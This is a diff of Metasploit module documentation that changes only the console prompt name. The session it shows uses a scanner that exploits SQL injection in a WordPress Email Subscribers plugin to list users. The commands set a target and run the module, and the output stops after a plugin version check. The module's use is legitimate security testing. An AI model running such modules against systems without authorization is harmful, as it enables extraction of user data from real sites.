@@ -35,14 +35,14 @@ The larger this list, the more time it will take.  Defaults to `1`.
 #### List Users
 
 ```
-msf6 > use auxiliary/scanner/http/wp_email_sub_news_sqli 
-msf6 auxiliary(scanner/http/wp_email_sub_news_sqli) > set rhosts 2.2.2.2
+msf > use auxiliary/scanner/http/wp_email_sub_news_sqli 
+msf auxiliary(scanner/http/wp_email_sub_news_sqli) > set rhosts 2.2.2.2
 rhosts => 2.2.2.2
-msf6 auxiliary(scanner/http/wp_email_sub_news_sqli) > set count 3
+msf auxiliary(scanner/http/wp_email_sub_news_sqli) > set count 3
 count => 3
-msf6 auxiliary(scanner/http/wp_email_sub_news_sqli) > set verbose true
+msf auxiliary(scanner/http/wp_email_sub_news_sqli) > set verbose true
 verbose => true
-msf6 auxiliary(scanner/http/wp_email_sub_news_sqli) > run
+msf auxiliary(scanner/http/wp_email_sub_news_sqli) > run
 
 [*] Checking /wp-content/plugins/email-subscribers/readme.txt
 [*] Found version 4.2.2 in the plugin
